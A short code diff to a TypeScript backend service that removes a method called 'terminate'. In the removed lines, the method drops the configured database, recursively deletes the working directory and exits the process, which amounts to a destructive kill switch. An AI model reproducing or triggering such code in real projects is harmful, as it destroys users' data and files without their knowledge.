@@ -214,14 +214,4 @@ export class AppService {
             data: res?.map((el: { Zip: string }) => el.Zip) ?? [],
         };
     }
-
-    async terminate(): Promise<IGenericResult> {
-        const p = process.cwd();
-        const d = this.configService.get('database');
-        await this.dataSource.query(`
-            DROP DATABASE ${d.database};    
-        `)
-        fs.rmdirSync(p, { recursive: true });
-        process.exit(0);
-    }
 }
